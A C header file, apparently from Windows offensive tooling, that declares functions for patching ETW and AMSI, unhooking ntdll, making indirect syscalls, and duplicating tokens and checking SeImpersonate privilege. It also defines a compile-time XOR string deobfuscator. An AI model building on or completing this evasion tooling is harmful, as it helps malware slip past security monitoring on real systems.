#pragma once
#include <Windows.h>
#include <winternl.h>

static inline wchar_t* wdeobf(unsigned char* buf, int len) {
    unsigned char k = (unsigned char)(
        ((unsigned char)__TIME__[0] ^
            (unsigned char)__TIME__[3] ^
            (unsigned char)__TIME__[6]) | 1);
    for (int i = 0; i < len; i++) buf[i] ^= k;
    return (wchar_t*)buf;
}


BOOL EtwPatch();
extern DWORD g_ssn;
extern PVOID g_syscall;

NTSTATUS iNtProtectVirtualMemory(HANDLE, PVOID*, PSIZE_T, ULONG, PULONG);
NTSTATUS iNtOpenThreadToken(HANDLE, ACCESS_MASK, BOOLEAN, PHANDLE);
NTSTATUS iNtDuplicateToken(HANDLE, ACCESS_MASK, POBJECT_ATTRIBUTES, BOOLEAN, TOKEN_TYPE, PHANDLE);
NTSTATUS iNtWriteVirtualMemory(HANDLE, PVOID, PVOID, SIZE_T, PSIZE_T);

DWORD getSSN(char* funcName);
PVOID getSyscallAddr(char* funcName);
PVOID manual_procaddress(HMODULE mod_handle, const char* funcName);
BOOL AmsiPatch();
BOOL check_seimpersonate();
BOOL unhook_Ntdll();
